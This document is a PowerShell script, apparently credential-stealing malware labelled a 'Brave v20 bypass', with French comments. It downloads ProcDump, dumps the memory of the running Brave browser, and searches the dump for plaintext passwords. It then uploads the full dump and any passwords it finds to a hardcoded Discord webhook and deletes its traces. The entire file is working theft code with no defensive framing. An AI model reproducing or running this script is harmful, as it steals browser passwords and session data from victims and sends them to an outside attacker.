$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

function Send {
    param([string]$m)
    Invoke-RestMethod -Uri $wh -Method Post -Body (@{content=$m}|ConvertTo-Json) -ContentType "application/json"|Out-Null
}

Send "🔓 Brave v20 bypass - Memory dump method..."

# IMPORTANT: NE PAS TUER BRAVE
if (!(Get-Process brave -EA 0)) {
    Send "⚠️ Brave not running - starting it..."
    Start-Process "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\Application\brave.exe"
    Start-Sleep 10
}

cd $env:TEMP

# Télécharger procdump (outil Microsoft officiel)
[Net.ServicePointManager]::SecurityProtocol='Tls12'

try {
    Send "📥 Downloading Procdump..."
    Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "pd.zip" -UseBasicParsing
    Expand-Archive "pd.zip" "pd" -Force
    
    # Dump mémoire du processus Brave
    Send "💾 Creating memory dump..."
    
    $braveProc = Get-Process brave | Select -First 1
    
    .\pd\procdump64.exe -accepteula -ma $braveProc.Id brave_dump.dmp 2>$null
    
    Start-Sleep 3
    
    if (Test-Path "brave_dump.dmp") {
        $size = (Get-Item "brave_dump.dmp").Length / 1MB
        Send "✅ Dump created: $([math]::Round($size,2)) MB"
        
        # Chercher les mots de passe en clair dans le dump
        Send "🔍 Searching for passwords in memory..."
        
        $dumpContent = [System.IO.File]::ReadAllText("brave_dump.dmp", [System.Text.Encoding]::ASCII)
        
        # Chercher des patterns de mots de passe
        $passwords = @()
        
        # Pattern : entre guillemets, 6+ caractères
        if ($dumpContent -match '"password":"([^"]{6,})"') {
            $passwords += $Matches[1]
        }
        
        # Compresser et envoyer le dump
        Compress-Archive "brave_dump.dmp" "dump.zip" -Force
        
        Send "📤 Uploading memory dump..."
        curl.exe -F "file=@dump.zip" $wh
        
        Remove-Item "brave_dump.dmp","dump.zip" -Force
        
        if ($passwords) {
            Send "🔑 Found passwords in memory:"
            foreach ($p in $passwords) {
                Send $p
            }
        } else {
            Send "⚠️ No plaintext passwords in dump - manual analysis needed"
        }
    } else {
        Send "❌ Dump creation failed"
    }
    
    Remove-Item "pd.zip","pd" -Recurse -Force
    
} catch {
    Send "❌ Error: $($_.Exception.Message)"
}

Send "🏁 Done"
